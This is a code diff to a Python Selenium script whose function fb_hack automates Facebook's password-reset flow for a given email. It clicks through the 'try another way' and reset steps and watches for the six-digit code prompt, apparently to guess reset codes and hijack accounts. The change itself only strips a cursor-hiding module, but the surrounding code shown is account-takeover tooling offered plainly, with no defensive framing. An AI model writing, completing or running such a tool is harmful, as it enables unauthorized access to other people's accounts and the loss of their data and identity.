@@ -4,7 +4,7 @@ from selenium.webdriver.common.keys import Keys
 from selenium import webdriver
 from time import sleep
 from bs4 import BeautifulSoup
-import itertools, sys, requests, mechanize, os, re, email, smtplib, ssl, selenium, shutil, cursor
+import itertools, sys, requests, mechanize, os, re, email, smtplib, ssl, selenium, shutil
 from email import encoders
 from email.mime.base import MIMEBase
 from email.mime.multipart import MIMEMultipart
@@ -37,7 +37,6 @@ def sleepy(counter):
 def fb_hack(email, codex):
   os.system('clear')
   soup = BeautifulSoup()
-  cursor.hide()
   options = webdriver.ChromeOptions()
   options.add_argument("--no-sandbox")
   options.add_argument("--disable-dev-shm-usage")
@@ -55,7 +54,6 @@ def fb_hack(email, codex):
     sleep(2)
     driver.save_screenshot("fail1.png")
     print("Failed at email")
-    cursor.show()
   try:
     search_button = driver.find_element(by = By.NAME, value = "tryanotherway")
     search_button.click()
@@ -64,7 +62,6 @@ def fb_hack(email, codex):
     sleep(2)
     driver.save_screenshot("fail2.png")
     print("Failed at try another way")
-    cursor.show()
   try:
     search_button = driver.find_element(by = By.NAME, value = "reset_action")
     search_button.click()
@@ -73,7 +70,6 @@ def fb_hack(email, codex):
     sleep(2)
     driver.save_screenshot("fail3.png")
     print("Failed at reset action")
-    cursor.show()
   counter = 0
   test = soup.find(string="pop")
   sixdigits = soup.find(string="Please check your email for a message with your code. Your code is 6 numbers long.")
@@ -120,7 +116,6 @@ def fb_hack(email, codex):
         respect = 0
         break
       sleepy(30)
-  cursor.show()
   past = int(respect)
   return past
 
